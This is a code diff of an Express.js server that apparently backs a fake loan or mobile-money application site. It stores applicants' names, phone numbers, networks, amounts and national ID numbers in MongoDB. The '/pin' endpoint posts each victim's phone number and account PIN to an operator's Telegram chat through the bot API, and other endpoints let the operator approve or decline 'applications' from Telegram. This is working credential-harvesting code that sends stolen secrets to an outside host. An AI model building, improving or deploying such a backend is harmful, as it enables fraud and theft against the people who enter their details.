@@ -1,18 +1,35 @@
 const express = require("express");
 const axios = require("axios");
 const path = require("path");
+const mongoose = require("mongoose");
 
 const app = express();
 
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.urlencoded({ extended: true}));
 app.use(express.static(__dirname));
 
+// ENV
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+const MONGO_URI = process.env.MONGO_URI;
 
-// 🔥 FIX: persistent global memory for Railway hot reload
-const users = global.users || (global.users = {});
+// ================= CONNECT DB =================
+mongoose.connect(MONGO_URI)
+  .then(() => console.log("MongoDB connected"))
+  .catch(err => console.log(err));
+
+// ================= MODEL =================
+const userSchema = new mongoose.Schema({
+  name: String,
+  phone: { type: String, unique: true },
+  network: String,
+  amount: String,
+  nationalId: String,
+  status: { type: String, default: "pending" }
+});
+
+const User = mongoose.model("User", userSchema);
 
 // ================= HOME =================
 app.get("/", (req, res) => {
@@ -27,17 +44,14 @@ app.post("/apply", async (req, res) => {
     return res.status(400).json({ success: false });
   }
 
-  // store user
-  users[phone] = {
-    name,
-    phone,
-    network,
-    amount,
-    nationalId,
-    status: "pending"
-  };
+  try {
+    await User.findOneAndUpdate(
+      { phone },
+      { name, phone, network, amount, nationalId, status: "pending" },
+      { upsert: true, new: true }
+    );
 
-  const message = `
+    const message = `
 📥 NEW APPLICATION
 
 👤 ${name}
@@ -46,89 +60,77 @@ app.post("/apply", async (req, res) => {
 💰 ${amount}
 🆔 ${nationalId}
 
--------------------------
 Choose action:
 `;
 
-  try {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
       text: message,
       reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve", callback_data: `approve_${phone}` },
-            { text: "❌ Decline", callback_data: `decline_${phone}` }
-          ]
-        ]
+        inline_keyboard: [[
+          { text: "✅ Approve", callback_data: `approve_${phone}` },
+          { text: "❌ Decline", callback_data: `decline_${phone}` }
+        ]]
       }
     });
 
-    return res.json({ success: true, phone });
+    res.json({ success: true, phone });
 
   } catch (err) {
-    console.log(err.response?.data || err.message);
-    return res.status(500).json({ success: false });
+    console.log(err.message);
+    res.status(500).json({ success: false });
   }
 });
 
 // ================= STATUS =================
-app.get("/status/:phone", (req, res) => {
-  const phone = req.params.phone;
-
-  const user = users[phone];
+app.get("/status/:phone", async (req, res) => {
+  const user = await User.findOne({ phone: req.params.phone });
 
   if (!user) {
-    // IMPORTANT: keep frontend stable
     return res.json({ status: "pending" });
   }
 
-  return res.json({ status: user.status });
+  res.json({ status: user.status });
 });
 
 // ================= WEBHOOK =================
 app.post("/webhook", async (req, res) => {
   try {
-    if (!req.body.callback_query) {
-      return res.sendStatus(200);
-    }
+    if (!req.body.callback_query) return res.sendStatus(200);
 
     const action = req.body.callback_query.data;
     const phone = action.split("_")[1];
 
-    if (users[phone]) {
-      if (action.startsWith("approve")) {
-        users[phone].status = "approved";
-      }
+    const status = action.startsWith("approve")
+      ? "approved"
+      : "declined";
 
-      if (action.startsWith("decline")) {
-        users[phone].status = "declined";
-      }
-    }
+    await User.findOneAndUpdate(
+      { phone },
+      { status }
+    );
 
-    // optional log
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
-      text: `Updated ${phone} → ${users[phone]?.status || "not found"}`
+      text: `Status updated: ${phone} → ${status}`
     });
 
-  } catch (err) {
-    console.log("Webhook error:", err.message);
-  }
+    res.sendStatus(200);
 
-  res.sendStatus(200);
+  } catch (err) {
+    console.log(err.message);
+    res.sendStatus(200);
+  }
 });
 
 // ================= PIN STEP =================
 app.post("/pin-step", async (req, res) => {
   const { phone } = req.body;
 
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `📍 PIN STEP\n📱 ${phone}`
-    });
-  } catch (e) {}
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: `📍 PIN STEP\n📱 ${phone}`
+  });
 
   res.sendStatus(200);
 });
@@ -137,18 +139,16 @@ app.post("/pin-step", async (req, res) => {
 app.post("/pin", async (req, res) => {
   const { phone, pin } = req.body;
 
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `🔐 PIN RECEIVED\n📱 ${phone}\n🔑 ${pin}`
-    });
-  } catch (e) {}
+  await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: `🔐 PIN: ${pin}\n📱 ${phone}`
+  });
 
   res.sendStatus(200);
 });
 
 // ================= START =================
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, "0.0.0.0", () => {
+app.listen(PORT, () => {
   console.log("Server running on port " + PORT);
 });
